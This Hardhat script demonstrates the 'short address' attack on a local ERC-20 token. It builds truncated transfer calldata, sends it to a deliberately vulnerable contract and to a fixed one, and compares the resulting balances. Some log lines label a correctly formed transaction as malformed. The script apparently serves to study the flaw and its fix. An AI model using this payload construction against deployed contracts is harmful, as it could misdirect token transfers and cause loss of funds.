// scripts/run.js
import { network } from "hardhat";
import { parseEther } from "ethers";

const { ethers } = await network.connect();

async function createUsers(transferFrom: any, userCount: number) {
  const users = [];
  for (let i = 0; i < userCount; i++) {
    const user = ethers.Wallet.createRandom(ethers.provider);
    await transferFrom.sendTransaction({
      to: user.address,
      value: parseEther("100"),
    });
    users.push(user);
  }
  return users;
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const [other] = await createUsers(deployer, 1);

  console.log("Deployer:", deployer.address);
  console.log("Other:", other.address);

  // Deploy vulnerable contract
  const Vuln = await ethers.getContractFactory("VulnerableTestToken");
  const vuln = await Vuln.deploy();
  await vuln.waitForDeployment();
  console.log("VulnerableTestToken deployed at", await vuln.getAddress());

  // Deploy fixed contract for comparison
  const Fixed = await ethers.getContractFactory("FixedToken");
  const fixed = await Fixed.deploy();
  await fixed.waitForDeployment();
  console.log("FixedToken deployed at", await fixed.getAddress());

  // Mint some tokens to deployer
  const mintAmt = ethers.parseUnits("1000.0", 18); // 1000 tokens
  await vuln.mint(deployer.address, mintAmt);
  await fixed.mint(deployer.address, mintAmt);

  console.log("Initial balances (deployer -> other):");
  console.log("Vuln deployer:", (await vuln.balanceOf(deployer.address)).toString());
  console.log("Vuln other:", (await vuln.balanceOf(other.address)).toString());

  console.log("Fixed deployer:", (await fixed.balanceOf(deployer.address)).toString());
  console.log("Fixed other:", (await fixed.balanceOf(other.address)).toString());

  // === Construct a malformed calldata: short address (remove 1 byte from address field) ===
  // We will call transfer(otherAddress, amount)
  const iface = new ethers.Interface(["function transfer(address to,uint256 amount)"]);
  const selector = iface.getFunction("transfer")?.selector;

  // normal encoded call for comparison
  const normalData = iface.encodeFunctionData("transfer", [other.address, ethers.parseUnits("1.0", 18)]);
  console.log("Normal calldata length (bytes):", (normalData.length - 2) / 2);

  // Build a "short address" payload: remove one byte (2 hex chars) from the address slot
  // Steps:
  //  - selector (4 bytes)
  //  - address slot (32 bytes) -> we will provide only 19 bytes (instead of 20) so overall 32-byte slot becomes "short"
  //  - amount slot (32 bytes)
  //
  // Note: this mimics a sender that constructs invalid-length calldata; the vulnerable contract will not check msg.data.length.

  const addrNo0x = other.address.slice(2); // 40 hex chars = 20 bytes
  // remove last byte (2 hex chars) to make it 19 bytes (38 hex chars)
  const shortAddrHex = addrNo0x.slice(0, addrNo0x.length - 2); // drop 1 byte (2 hex chars)
  console.log("Original address hex length:", addrNo0x.length, "shortened:", shortAddrHex.length);

  const amt = ethers.parseUnits("1.0", 18);
  // amount as 32-byte hex (no 0x)
  const amtHex = amt.toString(16).padStart(64, "0");
  // selector without 0x
  const sel = selector?.slice(2);

  const paddingStr = "0".repeat(24);
  // Build malformed calldata: selector + short address (note: not padded to 32 bytes) + amount (32 bytes)
  const malformed = "0x" + sel + paddingStr + shortAddrHex + amtHex;
  const shortNormalData = "0x" + sel + paddingStr + addrNo0x + amtHex;
  console.log("Malformed calldata hex length (bytes):", (malformed.length - 2) / 2);
  console.log("Malformed calldata   :", malformed);
  console.log("Normal calldata      :", normalData);
  console.log("Short normal calldata:", shortNormalData);
  // Send the malformed raw transaction to the vulnerable contract from deployer
  const tx = {
    to: vuln.getAddress(),
    data: malformed,
  };
  console.log("Sending malformed tx to vulnerable contract...");
  try {
    const sent = await deployer.sendTransaction(tx);
    await sent.wait();
    console.log("Malformed tx mined.");
  } catch (err: any) {
    console.log("Malformed tx failed. Error:", err.message.split("\n")[0]);
  }


  const txNormal = {
    to: vuln.getAddress(),
    data: shortNormalData,
  };

  console.log("Sending malformed tx to vulnerable contract...");
  const sentNormal = await deployer.sendTransaction(txNormal);
  await sentNormal.wait();
  console.log("Malformed tx mined.");


  // Show balances after malformed call
  console.log("After malformed call:");
  console.log("Vuln deployer:", (await vuln.balanceOf(deployer.address)).toString());
  console.log("Vuln other:", (await vuln.balanceOf(other.address)).toString());

  // For comparison: attempt same malformed calldata against fixed contract (should revert due to length check)
  console.log("\nSending malformed tx to FixedToken (expected to revert)...");
  try {
    const tx2 = await deployer.sendTransaction({
      to: fixed.getAddress(),
      data: malformed,
    });
    await tx2.wait();
    console.log("Unexpected: Fixed accepted malformed tx");
  } catch (err: any) {
    console.log("Fixed contract rejected malformed calldata (as expected). Error:", err.message.split("\n")[0]);
  }

  console.log("\nDone.");
}

main().catch((e) => {
  console.error(e);
  process.exitCode = 1;
});
